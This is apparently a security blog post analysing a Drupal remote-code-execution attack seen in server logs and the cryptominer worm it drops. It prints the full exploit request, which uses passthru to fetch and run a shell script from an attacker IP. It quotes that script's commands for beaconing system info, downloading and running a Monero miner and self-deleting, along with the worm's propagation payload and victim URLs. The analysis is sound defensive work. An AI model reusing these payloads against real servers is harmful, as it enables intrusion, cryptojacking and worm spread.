# Drupal Exploit Analysis 

Today I got some weird requests that caught my attention.   
  
XXXXXXXXXX.XXX/?q=user/password&name[#post_render][]=passthru&name[#markup]=wget%20-O%20/tmp/a.sh%20http://51.255.91.41/a.sh;%20sh%20/tmp/a.sh&name[#type]=markup  
  
Do you remember Drupal? Someone is trying to execute remote code in one of our servers. Let's see what it's trying to do:  
  
The a.sh file contains some interesing things. First of all, it sets up a path to work propertly:  
  
>ipath=`find / -xdev -writable -executable -type d -print | shuf -n 1`  
  
It searches for directories where, with the user that is executing it, has writable and executable permissions. It will work there.  
  
For statistics purposes (I supose), it makes a request to the resource hxxp://51.255.91.41/zz.php with the type parameter set to the servers info.   
  
>wget -O /dev/null "hxxp://51.255.91.41/zz.php?type=`uname -a`"  
  
After that, it downloads another file, a python script. We will analyse that later.  
  
>wget -O $ipath/t.py hxxp://51.255.91.41/scrape2.py  
  
What's the first think It does? Yes, as you thought. It downloads a miner and runs it.  
  
>wget -O $ipath/luk.tgz hxxp://www.lukminer.net/releases/latest.tgz  
>cd $ipath  
>tar -xzvf luk.tgz  
>chmod +x luk-cpu  
>./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user luk --pass x --no-fail-on-malloc > /dev/null&  
  
Then, it erases itself.  
  
>rm -rf a.sh  
  
It's funny, because it actually **does not run the python script**. It's programmed to do so, but It seems that it's in the development fase T.T'  
In the a.sh has commented the following lines:  
  
>for i in `seq 1 2`; do  
>#python $ipath/t.py > /dev/null&  
>done  
  
Let's see what it WILL do:  
  
First of all, it sets some variables:  
  
>threadcount = 25  
>timeout = 5  
>serverurl = "hxxp://51.255.91.41/y.php"  
>domain_queue = Queue()  
>threads = []  
  
Here we find what seems a whitelist domain list:  
  
>bl = ['facebook', 'ebay', 'linkedin', '.gov', 'microsoft', 'google']  
  
We don't want to bother the big guys >.<  
And it has a **propagation** function named drupal:  
  
>def drupal(target)  
  
It crafts the url with the payload and makes the request.  
  
>payload = "name[%23post_render][]=passthru&name[%23markup]=wget%20-O%20/tmp/a.sh%20http://51.255.91.41/a.sh;%20sh%20/tmp/a.sh&name[%23type]=markup"  
                  
>url = target + "?q=user/password&" + payload  
  
How gets the next targets? It asks the server (serverurl) for an URL list to target. It gets the following response (actual request):  
  
>hxxp://www.komornikrzeszow.com/  
>hxxp://www.labkotec.se/  
>https://inl.info.ucl.ac.be/  
>hxxp://www.austrolinks.info/  
>hxxp://www.proedgekettlebells.com/  
  
  
After it has the new victim list, it calls a "scrapedomain" function that tries to guess if the domain has drupal or not and if it has drupal, tries to exploit the victim's domain.  
  
**It has no persistency mechanism so far.**